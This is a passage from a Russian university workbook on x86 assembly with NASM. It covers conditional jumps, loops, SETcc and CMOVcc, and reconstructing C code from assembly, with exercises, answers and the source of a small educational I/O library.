     Не используя команд ROL, ROR, RCL, RCR и SAR, выписать фрагмент программы на
     ассемблере, реализующий действие указанной команды.


       а) sar eax, 2    b) rol bx, 1      c) rcr ecx, 1
       d) rol ax, 8     e) rcl ebx, 31


     Задача 4-12 Обращение операций
     После выполнения последовательности команд в регистре EAX было получено не-
     которое значение. Восстановите содержимое ячеек памяти.


       z dw ___________
       xor eax, eax
       or   ax, word [z]
       imul eax, eax, 16
       ; EAX = 0x1ee70




54
5.     Управляющие конструкции
Безусловная и условная передача управления
Набор машинных команд IA-32 содержит одну команду безусловного перехода jmp
и одну команду условного перехода Jcc, где сс – код условия, связанный с состоя-
нием флагов регистра EFLAGS (см. Табл. 6).

Таблица 6. Связь кодов условий и арифметических флагов.

Jcc             Условие                      Описание
JE         ZF                Равно / Ноль
JNE        ~ZF               Не равно / Не ноль
JS         SF                Отрицательное число
JNS        ~SF               Неотрицательное число
JG         ~(SF^OF)&~ZF      Больше (знаковые числа)
JGE        ~(SF^OF)          Больше либо равно (знаковые числа)
JL         (SF^OF)           Меньше (знаковые числа)
JLE        (SF^OF)|ZF        Меньше либо равно (знаковые числа)
JA         ~CF&~ZF           Больше (числа без знака)
JB         CF                Меньше (числа без знака)


Основным способом организации ветвлений и циклов в ассемблерной программе
является последовательность из двух действий: (1) выработка значений флагов ре-
гистра EFLAGS и (2) выполнение условного перехода. Первый пункт, как правило,
реализуется командой CMP, выполняющей с EFLAGS те же действия, что и команда
SUB, но не запоминающей результата вычитания, т.е. в результате ее выполнения
первый операнд не «разрушается».


     cmp   eax, 0
     je    .l2       ; Переход на метку .l2 при eax = 0


Значение флагов регистра EFLAGS может быть сформировано не только командой
CMP. Для реализации реакции программы на значение какого-то определенно фла-
га предусмотрены команды JZ, JS, JC, JO, JP (в коде условия указана первая буква
проверяемого флага), выполняющие переход при значении флага 1, и соответ-



                                                                              55
     ственно команды JNZ, JNS, JNC, JNO, JNP, выполняющие переход при нулевом зна-
     чении флага.

     В качестве примера рассмотрим реализацию реакции на возможное переполнение
     при выполнении сложения двух беззнаковых целых чисел, расположенных в реги-
     страх eax и ebx.


       add eax, ebx
       jc .uns_ov   ; Переход на метку .uns_ov при CF = 1


     Операции над булевыми переменными
     Единственными допустимыми значениями логического типа являются значения 0 и
     1, они представляют ложь и истину соответственно. Для хранения логического зна-
     чения компилятор gcc использует один байт.

     Формально, вычисление управляющих условий в операторах должно приводить
     получению булевской величины, которая затем должна проверяться. Но архитек-
     тура IA-32 позволяет сразу же воспользоваться флагами, выработанными арифме-
     тическими действиями, что позволяет не использовать лишние, с точки зрения
     производительности, инструкции.

     Тем не менее, в некоторых ситуациях необходимо явно использовать тип _Bool.


       #include <stdbool.h>                    section .data
                                                  p db 1
       static _Bool p = true;
       ...                                     section .text
       p = !p;                                    xor byte [b], 1


     В архитектуре IA-32 присутствует инструкция SETcc, которая помещает в свой
     единственный операнд либо 0, либо 1, в зависимости от выполнения условия, ука-
     занного в суффиксе кода операции. В качестве операнда может выступать как ре-
     гистр, так и память, но обязательно размером в один байт.

     Пример 5-1 Восстановление типа и операции сравнения
     Ниже приведен код на языке Си, где data_t – некоторый целочисленный тип дан-
     ных, а COMP – некоторая операция сравнения. Пусть переменная a расположена в
     регистре EDX, а переменная b в регистре ECX. По заданному ассемблерному коду,
     реализующему данную операцию сравнения, требуется восстановить data_t и
     COMP (возможно несколько вариантов решения).




56
  int comp(data_t a, data_t b) {           CMP ECX, EDX
     return a COMP b;                      SETL AL
  }


                                 Решение

Поскольку в инструкции SETcc используется код L, данные, расположенные в реги-
страх EAX и EDX рассматриваются как 32 разрядные знаковые числа. В языке Си со-
ответствующим типом может выступать int или long, причем допустим явно до-
бавленный спецификатор signed.

Операцией сравнения является «>», поскольку код L требует выполнения строгого
неравенства ОП1 < ОП2 в предыдущей инструкции.


  ОП1 < ОП2  ECX < EDX  b < a  a > b


Итого, имеем следующий вариант допустимого кода.


  int comp(int a, int b) {
     return a > b;
  }


Реализация ветвления и цикла
Типовым приемом при организации ветвления в операторе if является вычисле-
ние условия и последующая проверка условия в команде условного перехода; если
условие не выполнилось – переходим на метку, расположенную сразу после фраг-
мента кода, который реализует тело if.


  static int *p, a;                          mov eax, dword [p]
                                             test eax, eax
  if (p) {                                   jz .l
     a = *p;                                 mov eax, dword [eax]
  }                                          mov dword [a], eax
                                           .l:


При реализации оператора if-else можно воспользоваться этим же приемом,
слегка его дополнив, а можно закодировать в условной передаче уравнения пере-
ход на ветку «истина», разместив сразу после условной передачи управления ветку
«ложь». Ниже показаны два эквивалентных варианта.



                                                                             57
       static int *p, a, b;

       if (p) {            mov eax, dword [p]            mov eax, dword [p]
          a = *p;          test eax, eax                 test eax, eax
       } else {            jz .false                     jnz .true
          b = -*p;         mov eax, dword [eax]          mov eax, dword [eax]
       }                   mov dword [a], eax            neg eax
                           jmp .if_end                   mov dword [b], eax
                         .false:                         jmp .if_end
                           mov eax, dword [eax]        .true:
                           neg eax                       mov eax, dword [eax]
                           mov dword [b], eax            mov dword [a], eax
                         .if_end:                      .if_end:


     Если переход на метку, расположенную ниже в тексте означает ветвления, то пере-
     ход на ветку, расположенную выше может привести к коду, который уже выпол-
     нялся, что позволяет организовывать циклы.

     Ниже приведен фрагмент кода, который подсчитывает число символов введенной
     строки, включая последний символ – перевод строки.


          xor ebx, ebx         ; Обнулили счетчик
        .loop_cycle:           ; Сюда будем возвращаться
          inc ebx              ; Увеличиваем счетчик
          call io_get_char     ; Считываем что-то со стандартного входа
          cmp al, `\n`         ; Сравниваем с переводом строки
          jne .loop_cycle      ; Если не конец строки – возвращаемся


     Пример 5-2 Ветви прорастают
     Реализуйте на языке ассемблера приведенный Си-код.


       static long *a, b, c;
       ...

       if (a) {
          if (b > c) {
             *a += b;
          }
       } else {
             a = &c;
             *a -= b;
       }




58
                                Решение

Каждая переменная требует для хранения 4 байта памяти, которая должна быть
выделена в одной из секций статических данных: .data или .bss.

Вычисления должны начаться с проверки первого условия. Если условие не будет
выполняться – следует передать управление на блок кода else, помеченного .l1.
В противном случае, т.е. когда условие выполняется, проверяем второе условие.
Если оно не выполняется, следует сразу же выходить из объемлющего оператора
if-else. Также и из тела вложенного оператора if следует выполнить безуслов-
ный переход на эту же метку .l2, чтобы не началось выполнение ветки else объ-
емлющего оператора if-else.


  section .bss               ; Выделяем необходимую память
     a resd 1
     b resd 1
     c resd 1

  section .text
     mov edx, dword [b]   ; Упреждающе загружаем на регистр
                          ; переменную b. Она потребуется в любом
                          ; случае.
     mov eax, dword [a]   ; Загружаем на регистр указатель a
     test eax, eax        ; Если указатель нулевой -
     jz   .l1             ; переходим на ветку else
     cmp edx, dword [c]   ; Если b меньше или равно c -
     jle .l2              ; сразу покидаем оба оператора
     add dword [eax], edx ; Прибавляем к *a значение переменной b
     jmp .l2              ; Переходим на конец if-else
   .l1:                   ; Начало ветки else
     mov dword [a], c     ; Присваиваем a адрес переменной c
     mov eax, c           ; Этот же адрес потребуется на регистре
     sub dword [eax], edx ; Вычитаем из *a значение переменной b
   .l2:


Пример 5-3 Геометрическая прогрессия
Напишите программу, вычисляющую i-ый элемент геометрической прогрессии. На
вход программе дают три целых числа: b, q, i. На стандартный выход требуется
напечатать bi. Нумерация элементов начинается с 0. Для хранения чисел исполь-
зуйте тип int, отслеживать переполнение не требуется.

                                Решение

Разместим входные данные в регистрах. i будем хранить в ecx. Вычисление i-го
элемента будет проводиться в цикле, условие окончания которого – нулевой ecx.


                                                                           59
     Если ecx изначально нулевой, тело цикла не должно выполняться. b будем хранить
     в ebx. Этот же регистр будет использоваться для сохранения результата вычисле-
     ний i-го элемента. В случае, когда i = 0, ebx уже содержит нужное число. Для хра-
     нения q будет использоваться edi.


       extern io_get_dec, io_print_dec

       section .text
       global main
       main:
          call io_get_dec          ; Вводим b
          mov ebx, eax             ; (Значение ebx не изменится
                                   ; в результате следующих вызовов)
           call io_get_dec         ; Вводим q
           mov edi, eax            ; (Значение edi не изменится
                                   ; в результате следующего вызова)
           call io_get_dec         ; Вводим i
           mov ecx, eax            ;
           jmp .check_condition
         .loop_body:
           imul ebx, edi        ; Вычисляем следующий элемент
           dec ecx              ; Уменьшаем счетчик не единицу
         .check_condition:
           cmp ecx, 0          ; Итерируемся, пока счетчик не обнулился
           jne .loop_body
           mov eax, ebx
           call io_print_dec    ; Печатаем результат
           mov eax, 0
           ret
                                       Вариант «А»


     Тело цикла содержит одно умножение с накоплением результата в регистре ebx и
     уменьшение счетчика цикла – регистра ecx – на единицу.

     В рассмотренном примере для организации цикла были использованы команды
     условного и безусловного переходов. Приведем фрагмент другой реализации того
     же примера, где цикл организован с помощью команды LOOP. Считаем, что исход-
     ные значения регистров ecx, ebx и edi уже заданы.


           jecxz .print            ; Не выполняем тело цикла при ecx = 0
         .loop_body:
           imul ebx, edi           ; Вычисляем следующий элемент
           loop .loop_body
         .print:
           mov eax, ebx
           call io_print_dec       ; Печатаем результат
                                       Вариант «Б»


60
Тело цикла будет повторено i раз (именно такое значение находится в регистре ecx
перед началом цикла), причем команда jecxz обеспечит корректное выполнение
данного фрагмента при ecx = 0.

Короткая логика
Выполнение операций короткой логики && и || позволяет сэкономить время за
счет того, что если общий результат заранее понятен, исходя из значения левого
операнда – правый операнд не будет вычисляться. Реализация таких операций
должна пропускать выполнение части инструкций, что можно обеспечить условной
передачей управления.

Рассмотренный выше пример, в котором указатель проверяется на ноль и только
потом происходит разыменование, может быть переписан без использования опе-
ратора if. Реализующий его код не изменится.


  static int *p, a;                          mov eax, dword [p]
                                             test eax, eax
  (p) && (a = *p);                           jz .l
                                             mov eax, dword [eax]
                                             mov dword [a], eax
                                           .l:


Пример 5-4 Восстановление управляющих конструкций
Требуется записать соответствующий данному фрагменту на ассемблере фрагмент
кода на языке Си.


  SECTION .text
  GLOBAL main
  main:
     MOV ESI, DWORD [a]         ; (1)
     TEST ESI, ESI              ; (2)
     JE   .1                    ; (3)
     MOV ECX, DWORD [b]         ; (4)
     TEST ECX, ECX              ; (5)
     JE   .1                    ; (6)
     MOV EDX, DWORD [ESI]       ; (7)
     MOV EAX, EDX               ; (8)
     SAR EDX, 31                ; (9)
     IDIV ECX                   ; (10)
     SUB DWORD [ESI], EDX       ; (11)
   .1:
     XOR EAX, EAX               ; (12)
     RET                        ; (13)




                                                                              61
                                      Решение

     Просматривая ассемблерный код можно заметить обращения к двум статическим
     переменным a и b. В первый момент можно определить только их разрядность –
     обе переменные 32-разрядные. Определить, являются они целыми числами или
     адресами, можно только просмотрев остальной код. Поэтому временно выпишем
     объявление переменных в следующем виде.


       static int a, b;


     Далее рассмотрим поток управления: происходит условная передача управления
     из инструкций 3 и 6 на помеченную инструкцию 12. Причем перед условной пере-
     дачей происходит только загрузка значений переменных на регистры и проверка
     этих значений на равенство с нулем (инструкции TEST и JE) . Таким образом блок
     инструкций 1-6 может быть представлен в следующем виде:


       if ((0 != a) && (0 != b)) {              if (0 != a) {
          ...                                      if (0 != b) {
       }                                              ...
                                                   }
                                                }
                Вариант «А»                              Вариант «Б»


     Оба варианта допустимы, однако следует отметить необходимость использовать
     во варианте «А» именно оператор && короткой логики, поскольку инструкции 4-6
     выполняются только в том случае, если не сработал условный переход в инструк-
     ции 3.

     Теперь рассмотрим блок инструкций 7-11. В первой же инструкции этого блока ре-
     гистр ESI, в котором размещено значение переменной a используется в адресном
     коде, т.е. переменная a является указателем, а объявление переменных следует
     скорректировать.


       static int *a, b;


     Значение, взятое из памяти, размещается в паре регистров eax и edx, сразу после
     чего происходит арифметический сдвиг регистра edx – типовые действия перед
     делением целых чисел, которое, в свою очередь, выполняется в 10 инструкции.
     Следует отметить, что используется инструкция знакового деления – в объявление
     переменных следует внести модификатор signed, но поскольку он задействован
     по умолчанию для типа int, объявление можно не менять.

62
Операндами инструкции idiv выступили величины *a и b, поскольку в момент вы-
полнения этой инструкции на регистре ecx было расположено именно значение
переменной b. Однако эта инструкция может применяться для реализации двух
операций языка Си – деления и взятия остатка. Выяснить, какая именно операция
была реализована можно по тому, какой регистр в дальнейшем использовался в
вычислениях. В данном случае это регистр edx (он используется в инструкции 11),
что приводит к заключению – реализована операция взятия остатка. Использова-
ние этого значения заключается в том, что оно вычитается из числа, на которое
указывает переменная a. В итоге будет составлено следующее выражение на язы-
ке Си.


  *a = *a – *a % b;


Собирая весь код вместе и выполняя некоторое преобразование для выражения,
содержащегося в теле оператора if, получаем следующий код.


  static int *a, b;
  if ((0 != a) && (0 != b)) {
     *a -= *a % b;
  }


Условная передача данных
Помимо условной передачи управления архитектура IA-32 позволяет непосред-
ственно присваивать значения только в случае выполнения заданного условия.
Примером такого присвоения является рассмотренная выше инструкция SETcc. Но
ее возможности ограничены – присваивается не произвольное целое число, а
только true/false.

В процессор Pentium Pro была добавлена инструкция CMOVcc, позволяющая услов-
но присваивать любое целое число. При выполнении закодированного в инструк-
ции условия происходит пересылка в операнд-регистр содержимого второго опе-
ранда, им может быть только регистр или память, непосредственно закодирован-
ная величина недопустима.

В приведенном ниже примере порядок выполнения инструкций неизменен, но
присвоение в eax уменьшенной на 1 величины выполнится только когда а > 0.




                                                                             63
       static int a;                             mov      eax, dword [a]
                                                 mov      edx, eax
       (а > 0) && (a--);                         dec      edx
                                                 test     eax, eax
                                                 cmovg    eax, edx
                                                 mov      dword [a], eax


     Задачи

     Задача 5-1 Восстановление типа и операции сравнения
     Дан следующий код на языке Си


       int comp(data_t a) {
          return a COMP 0;
       }


     где data_t – некоторый целочисленный тип данных, а COMP – некоторая операция
     сравнения. Пусть переменная a расположена в регистре EСX. По заданному ассем-
     блерному коду, реализующему данную операцию сравнения, требуется восстано-
     вить data_t и COMP (возможно несколько вариантов решения).


       (A)                                  (В)
       TEST EСX, EСX                        TEST СL, СL
       SETNE AL                             SETG AL

       (Б)                                  (Г)
       TEST СX, СX                          TEST СX, СX
       SETE AL                              SETA AL


     Задача 5-2 Восстановление типа и операции сравнения
     Ниже приведен код на языке Си, где data_t – некоторый целочисленный тип дан-
     ных, а COMP – некоторая операция сравнения. Пусть переменная a расположена в
     регистре EDX, а переменная b в регистре ECX. По заданному ассемблерному коду,
     реализующему данную операцию сравнения, требуется восстановить data_t и
     COMP (возможно несколько вариантов решения).


       int comp(data_t a, data_t b) {
          return a COMP b;
       }




64
  (А)                                   (В)
  CMP DX, CX                            CMP EDX, ECX
  SETGE AL                              SETNE AL

  (Б)
  CMP DL, CL
  SETB AL


Задача 5-3 Реализация тернарного оператора на языке ассемблера
Дан фрагмент Си-кода.


  int x, y = 100, a = 0, b = 1;
  x = y <= 0 ? a : b;


Требуется реализовать тернарный оператор x = (y <= 0? a : b) на языке ас-
семблера, используя инструкцию CMOVcc.

Задача 5-4 Модуль числа
Требуется составить программу, которая для заданного с клавиатуры числа печата-
ет модуль этого числа.

Задача 5-5 Реализация тела функции
Дана Си-функция.


  void cond(int a, int *p) {
     if (p && a > 0) {
        *p += a;
     }
  }


Требуется написать соответствующий код на языке ассемблера. Размещение фор-
мальных параметров функции считать следующим:


  mov edx, dword [ebp + 8] ; int a
  mov eax, dword [ebp + 12] ; int *p


Задача 5-6 Вычисление факториала
Требуется написать ассемблерную программу, вычисляющую факториал заданного
числа.




                                                                             65
     Задача 5-7 Вычисление суммы арифметической прогрессии
     Требуется написать ассемблерную программу, вычисляющую сумму первых членов
     арифметической прогрессии. С клавиатуры задаются: первый член прогрессии,
     шаг, количество членов прогрессии, которые требуется суммировать.

     Задача 5-8 Восстановление структуры программы: ветвления
     Дан ассемблерный код, реализующий код Си-функции.


        mov eax, dword [ebp + 8] ; параметр x
        mov edx, dword [ebp + 12] ; параметр y
        cmp eax, -3
        jge l2
        cmp eax, edx
        gle l3
        imull eax, edx
        jmp l4
       l3:
        lea eax, dword [eax + edx]
        jmp l4
       l2:
        cmp eax, 2
        jg l5
        xor eax, edx
        jmp l4
       l5:
        sub eax, edx
       l4:



     Сама Си-функция задана с пропущенными выражениями в операторах.


       int test(int x, int y) {
          int val = __________;
          if (______) {
             if (______) {
                val = __________;
             } else {
                val = __________;
             }
          } else if (______) {
                val = __________;
          }
          return val;
       }


     Требуется восстановить пропущенные выражения.


66
Задача 5-9 Восстановление структуры программы: ветвления
Дан ассемблерный код, реализующий код на языке Си.


         mov   ebx, dword [a]        ...
         mov   ecx, dword [b]           static _____________________ a;
         cmp   ebx, ecx                 static _____________________ b;
         jg    .L7                      static _____________________ c;
         jl    .L8                      static _____________________ d;
         xor   eax, eax                 if (__________) {
         jmp   .L9                         d = ________________;
  .L8:                                  } else if (__________) {
         mov edx, dword [c]                d = ________________;
         mov eax, edx                   } else {
         sar edx, 31                       d = ________________;
         sub ecx, ebx                   }
         idiv ecx                    ...
         jmp .L9
  .L7:
         mov edx, dword [c]
         mov eax, edx
         sar edx, 31
         sub ebx, ecx
         idiv ebx
  .L9:
         mov   dword [d], eax


Требуется восстановить пропуски в Си-коде.

Задача 5-10 Числа с различными цифрами
Напечатать все двузначные числа, у которых цифры не равны между собой.

Задача 5-11 Восстановление структуры программы: циклы
Дан код на языке Си


  int dw_loop(int x, int y, int n) { //1
  {                                  //2
    do {                             //3
       x += n;                       //4
       y *= n;                       //5
       n--;                          //6
    } while ((n > 0) && (y < n));    //7
    return x;                        //8
  }


компилятор генерирует следующий ассемблерный код:



                                                                          67
          mov eax, dword [ebp + 8] ; (1) переменная x
          mov ecx, dword [ebp + 12] ; (2) переменная y
          mov edx, dword [ebp + 16] ; (3) переменная n
       L2:                          ; (4)
          add eax, edx              ; (5)
          imul ecx, edx             ; (6)
          sub edx, 1                ; (7)
          test edx, edx             ; (8)
          jle L5                    ; (9)
          cmp ecx, edx              ; (10)
          jl L2                     ; (11)
       L5:                          ; (12)


     Разметить ассемблерный код комментариями, выделив в нем выражение-условие,
     проверяемое в цикле, и операторы, составляющие тело цикла в Си-коде.

     Задача 5-12 Переход на метку
     Указать, на какую метку будет осуществлен переход при выполнении следующего
     фрагмента ассемблерного кода:


       mov al, -80
       cmp al, 150
       jb M1
       jl M2
       jmp M3


     Задача 5-13 Сумма цифр числа
     Найти сумму цифр заданного неотрицательного целого числа типа unsigned int.

     Задача 5-14 Число Фибоначчи
     Найти первое по порядку число Фибоначчи, превосходящее заданное неотрица-
     тельное значение N (N > 1). Числа Фибоначчи задаются соотношением:
     F0 = F1 = 1, Fk = Fk-1 + Fk-2, k ≥ 2.

     Задача 5-15 Максимум последовательности
     Дана последовательность из 30 целых чисел. Найти:
        a) максимум данной последовательности,
        b) номер максимального элемента последовательности (считать, что последо-
           вательность не содержит повторяющихся элементов),
        c) количество вхождений максимального элемента в последовательность.




68
Текст учебной библиотеки ввода/вывода
Файл macro.c1, содержимое которого приведено ниже, распространяется вместе
со скриптом для сборки учебных программ build_asm.sh (который помимо проче-
го включает определенные в нем функции в итоговый исполнимый файл), а также
в составе учебной среды разработки с открытым исходным кодом SASM2.
#include <stdio.h>

FILE *get_stdin(void) { return stdin; }
FILE *get_stdout(void) { return stdout; }

// I/O functions easily callable from asm
// - Accept under-aligned stack
// - Return value (if any) in EAX
// - Up to three arguments in EAX, EDX, ECX
// - Preserve EBX, EBP, ESP, EDI, ESI
//
// Extends macro.c from SASM (usually /usr/share/sasm/NASM/macro.c)

#define IO_ATTR __attribute__((regparm(3),force_align_arg_pointer))

// Input facilities

// Read a 32-bit number using %d/%u/%x format, return value in EAX
IO_ATTR int      io_get_dec(void);
IO_ATTR unsigned io_get_udec(void);
IO_ATTR unsigned io_get_hex(void);

// Read a character via getchar(), return value in EAX
IO_ATTR int io_get_char(void);

// Read a string, 'buf' in EAX, 'size' in EDX
IO_ATTR void io_get_string(char *buf, int size);

// Output facilities

// Print a 32-bit number in EAX using %d/%u/%x format
IO_ATTR void io_print_dec(int v);
IO_ATTR void io_print_udec(unsigned v);
IO_ATTR void io_print_hex(unsigned v);

// Print a character in AL
IO_ATTR void io_print_char(char c);

// Print a string addressed by EAX
IO_ATTR void io_print_string(const char *s);

1
    Название файла обусловлено историческими причинами.
2
    https://dman95.github.io/SASM/


                                                                         69
     // Start a new line
     IO_ATTR void io_newline(void);

     IO_ATTR
     int io_get_dec(void)
     {
          int r;
          scanf("%d", &r);
          return r;
     }

     IO_ATTR
     unsigned io_get_udec(void)
     {
          unsigned r;
          scanf("%u", &r);
          return r;
     }

     IO_ATTR
     unsigned io_get_hex(void)
     {
          unsigned r;
          scanf("%x", &r);
          return r;
     }

     IO_ATTR
     int io_get_char(void)
     {
          return getchar();
     }

     IO_ATTR
     void io_get_string(char *buf, int size)
     {
          fgets(buf, size, stdin);
     }

     IO_ATTR
     void io_print_dec(int v)
     {
          printf("%d", v);
     }

     IO_ATTR
     void io_print_udec(unsigned v)
     {
          printf("%u", v);
     }


70
IO_ATTR
void io_print_hex(unsigned v)
{
     printf("%x", v);
}

IO_ATTR
void io_print_char(char c)
{
     putchar(c);
}

IO_ATTR
void io_print_string(const char *s)
{
     fputs(s, stdout);
}

IO_ATTR
void io_newline(void)
{
     putchar('\n');
}

__attribute__((constructor))
static void unbuffer_stdout(void)
{
     setbuf(stdout, 0);
}




                                      71
     Ответы и решения
     Задача 1-1
           Двоичное            16-ричное            Число           Число
      представление (байт)   представление      десятичное со   десятичное без
                                 (байт)            знаком           знака
           10111101              BDh                -67              189
           01110110              76h                118              118
           00101000              28h                 40               40
           10000111              87h                -121             135

     Задача 1-5
     (а) EAX = 0xdde                         (е) EAX = 0xfffffef0

     (б) EAX = 0xd                           (ж) EAX = 0xffff000d

     (в) EAX = 0xcafe                        (з) EAX = 0xffff006f

     (г) EAX = 0xfffffffe                    (и) EAX = 0xff79000d

     (д) EAX = 0xffff00ba                    (к) EAX = 0x2179fffe

     Задача 1-6

       section .bss
          a resd 1
          b resd 1

       section .text
          mov al, byte [a]
          mov byte [b], al
          mov al, byte [a + 1]
          mov byte [b + 3], al
          mov ax, word [a + 2]
          mov word [b + 1], ax


     Задача 2-1

       ; a
       movzx eax, byte [a]
       mov dword [b], eax

       ; b
       movsx eax, byte [a]
       mov word [b], eax




72
Задача 2-2
   (a) ALзнаковое = -118,   ALбеззнаковое = 138, CF = 1, OF = 0, ZF = 0, SF = 1.
   (b) ALзнаковое = 5,      ALбеззнаковое = 5,    CF = 0, OF = 0, ZF = 0, SF = 0.
   (c) ALзнаковое = -90,    ALбеззнаковое = 166, CF = 1, OF = 0, ZF = 0, SF = 1.
   (d) ALзнаковое = 58,     ALбеззнаковое = 58,   CF = 1, OF = 0, ZF = 0, SF = 0.

Задача 3-1

   void decode2(int *xp, int *yp, int *zp) {
       int y = *yp;

        *yp = *xp + *zp;
        *xp = *yp;
        *zp = y;
   }


Задача 4-4
         eax = -8
         edx = 65528

Задача 4-12 Обращение операций

   z dw 0x1ee7
   xor eax, eax
   or   ax, word [z]
   imul eax, eax, 16
   ; EAX = 0x1ee70


Задача 5-1

   (А)
   data_t – int, unsigned, указатель,
            для целочисленных типов допустим спецификатор long
   COMP - !=

   (Б)
   data_t – short или unsigned short
   COMP - ==

   (В)
   data_t – char
   COMP - >

   (Г)
   data_t – unsigned short
   COMP - >




                                                                                    73
     Задача 5-2

       (А)
       data_t – short
       COMP - >=

       (Б)
       data_t – unsigned char
       COMP - <

       (В)
       data_t – int, unsigned, указатель;
                для целочисленных типов допустим спецификатор long
       COMP - !=


     Задача 5-3

       section .bss
           x resd 1

       section .data
           y dd 100
           a dd 0
           b dd 1

       section .text
       global main
       main:
           cmp dword [y], 0
           mov eax, dword [b]
           cmovle eax, dword [a]
           mov dword [x], eax




74
Задача 5-4

  extern io_get_dec, io_print_dec, io_newline

  section .text
  global main
  main:
     call io_get_dec
     cmp eax, 0
     jge label
     neg eax
   label:
     call io_print_dec
     call io_newline
     xor eax, eax
     ret


Задача 5-5

  test eax, eax
   jz label
   test edx, edx
   jle label
   add dword [eax], edx
  label:


Задача 5-6

  extern io_get_dec, io_print_dec

  section .text
  global main
  main:
     call io_get_dec
     mov ecx, eax
     mov eax, 1
     jecxz end_label
    loop_body:
     imul eax, ecx
     loop loop_body
    end_label:
     call io_print_dec
     mov eax, 0
     ret




                                                75
     Задача 5-7

       extern io_get_dec, io_print_dec, io_newline

       section .text
       global main
       main:
          call io_get_dec ; первый член
          mov esi, eax
          call io_get_dec ; шаг прогрессии
          mov edi, eax
          call io_get_dec ; количество шагов
          mov ecx, eax

          xor eax, eax
          jecxz .end_label
        .loop_body:
          mov eax, esi
          add esi, edi
          loop .loop_body
        .end_label:
          call io_print_dec
          call io_newline
          xor eax, eax
          ret


     Задача 5-8

       int test(int x, int y) {
          int val = x^y;
          if (x < -3) {
             if (y < x) {
                val = x * y;
             } else {
                val = x + y;
             }
          } else if (x > 2) {
             val = x - y;
          }
          return val;
       }


     Восстанавливать можно по следующей методике. В первую очередь выявляются
     линейные блоки. Строится граф потока управления для ассемблерной программы.
     Этот граф сопоставляется с предложенным шаблоном программы. В концах базо-
     вых блоков выявляются пары инструкций CMP Jcc, которые позволяют восстано-
     вить условия операторов if и их ветви. Следует отметить, что для заданного ас-
     семблерного кода будет корректно и такое восстановление.

76
  int test(int x, int y) {
     int val;
     if (x < -3) {
        if (y < x) {
           val = x * y;
        } else {
           val = x + y;
        }
     } else if (x > 2) {
       val = x - y;
     } else {
       val = x^y;
     }
     return val;
  }


Задача 5-9

  ...
     static int a;
     static int b;
     static int c;
     static int d;
     if (a > b) {
        d = c / (a - b);
     } else if (a < b) {
        d = c / (b - a);
     } else {
        d = 0;
     }
  ...




                             77
     Задача 5-10

       extern io_print_dec, io_newline

       section .text
       global main
       main:
               mov esi, 1
       .loop1:                     ; цикл по старшей цифре
               cmp esi, 10
               jge .exit1
               xor edi, edi
       .loop2:                     ; цикл по младшей цифре
               cmp edi, 10
               jge .exit2
               cmp esi, edi        ; проверка цифр на неравенство
               je .lc
               mov eax, esi
               call io_print_dec
               mov eax, edi
               call io_print_dec
               call io_newline
       .lc:
               inc edi
               jmp .loop2
       .exit2:
               inc esi
               jmp .loop1
       .exit1:
               xor esi, esi
               ret


     Задача 5-11

        mov eax, dword [ebp + 8] ; (1) переменная x
        mov ecx, dword [ebp + 12] ; (2) переменная y
        mov edx, dword [ebp + 16] ; (3) переменная n
       L2:                        ; (4)
        add eax, edx              ; (5) x += n;
        imul ecx, edx             ; (6) y *= n;
        sub edx, 1                ; (7) n--;
        test edx, edx             ; (8) n v 0
        jle L5                    ; (9) n <= 0 – выходим из цикла
        cmp ecx, edx              ; (10) y v n
        jl L2                     ; (11) y < n
                                  ;      переходим на новую итерацию
       L5:                        ; (12)




78
Задача 5-12
Ответ: M3


Решение:


  mov al, -80; доп(-80) = 176
  cmp al, 150; 150 = доп(-106)
  jb M1
  jl M2
  jmp M3


Переход на метку M1 не будет осуществлен, поскольку 176 > 150; переход на метку
M2 также не будет осуществлен, т.к. -80 > -106. Будет выполнен переход на метку
M3.




                                                                             79
     Литература
     1.   Рэндал Э. Брайант, Дэвид О’Халларон. Компьютерные системы: архитектура
          и программирование (Computer Systems: A Programmer’s Perspective). Изда-
          тельство: БХВ-Петербург, 2005 г. — 1186 стр.

     2.   Henry S. Warren. Hacker's Delight (2nd Edition). / Addison-Wesley Professional; 2
          edition (October 5, 2012) — р. 512

     3.   А.А. Белеванцев, С.С. Гайсарян, Л.С. Корухова, Е.А. Кузьменкова,
          В.С. Махнычев. Семинары по курсу “Алгоритмы и алгоритмические языки”
          (учебно-методическое пособие для студентов 1 курса ). М.: Издательский от-
          дел факультета ВМК МГУ имени М.В. Ломоносова

     4.   А.А. Белеванцев, С.С. Гайсарян, В.П. Иванников, Л.С. Корухова, В.А. Падарян.
          Задачи экзаменов по вводному курсу программирования (учеб-
          но - методическое пособие). М.: Изд. отдел ф-та ВМК МГУ имени М.В. Ломо-
          носова, 2012.

     5.   К.А. Батузов, А.А. Белеванцев, Р.А. Жуйков, А.О. Кудрявцев, В.А. Падарян,
          М.А. Соловьев. Практические задачи по вводному курсу программирования
          (учебное пособие). М.: Изд. отдел ф-та ВМК МГУ имени М.В. Ломоносова,
          2012.




80
   МОСКОВСКИЙ ГОСУДАРСТВЕННЫЙ УНИВЕРСИТЕТ

              имени М.В. Ломоносова

 Факультет вычислительной математики и кибернетики




Е.А. Кузьменкова, В.А. Падарян, М.А. Соловьев



     Семинары по курсу
     "Архитектура ЭВМ и
      язык ассемблера"
      (учебно-методическое пособие)
                     Часть 2




                    МАКС ПРЕСС

                   Москва – 2023
УДК 004.2+004.43(075.8)
ББК 32.973-02я73
    К89

             Печатается по решению Редакционно-издательского Совета
              факультета вычислительной математики и кибернетики
                            МГУ имени М.В. Ломоносова

                                        Рецензенты:
                                 C.Ю. Соловьев, профессор
                                   А.Н. Терехин, доцент

Е.А. Кузьменкова, В.А. Падарян, М.А. Соловьев

К89 Семинары по курсу «Архитектура ЭВМ и язык ассемблера»: учебно-
    методическое пособие. Часть 2. — М. Издательский отдел факультета ВМиК
    МГУ им. М.В. Ломоносова (лицензия ИД № 05899 от 24.09.2001); МАКС Пресс,
    2014. – 100 с.

ISBN 978-5-89407-530-3

ISBN 978-5-317-04886-0

Учебное пособие содержит задачи и упражнения по второй части семинарских занятий
курса «Архитектура ЭВМ и язык ассемблера», прочитанного студентам 1 потока 1 курса
факультета Вычислительной математики и кибернетики МГУ в 2010-2014 гг. Пособие
предназначено для студентов, изучающих основной курс программирования, а также
для преподавателей и аспирантов.
Ключевые слова: архитектура ЭВМ, язык ассемблера, x86, nasm, реализация языка Си.

                                                                      УДК 004.2+004.43(075.8)

                                                                             ББК 32.973-02я73

This textbook contains problems and exercises for the second part of the seminar activities of
the "Computer architecture and assembly language" course for 1st year 1st stream students of
the faculty of Computational Mathematics and Cybernetics of Moscow State University that
had been delivered in 2010-2014. The textbook is aimed at students learning the base pro-
